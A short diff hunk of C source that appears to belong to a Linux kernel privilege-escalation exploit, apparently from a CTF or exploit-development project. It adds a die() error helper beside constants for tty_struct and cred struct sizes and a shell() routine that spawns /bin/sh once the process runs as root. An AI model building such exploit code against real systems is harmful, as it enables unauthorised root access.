@@ -14,6 +14,11 @@
 #define TTY_STRUCT_SIZE 0x2E0
 #define CRED_STRUCT_SIZE 0xA8
 
+void die(const char* msg){
+    perror(msg);
+    exit(-1);
+}
+
 void shell(){
     if(!getuid()){
         system("/bin/sh");
